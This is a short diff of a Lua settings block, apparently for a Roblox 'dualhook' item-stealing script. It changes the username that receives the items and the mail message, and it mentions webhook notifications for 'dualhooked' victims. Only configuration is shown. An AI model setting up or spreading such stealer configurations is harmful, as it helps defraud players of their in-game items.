@@ -8,9 +8,9 @@
 ]]--
 
 getgenv().Settings = {
-    User = "DokebWasTaken",
+    User = "hackjeny_rip",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = "|Dokeb On Top| .gg/HQ354h2D",
+    MailMessage = "|Dokeb On Top|",
     Titanics = {
         Dualhook = true,
         Intensity = 100 --%
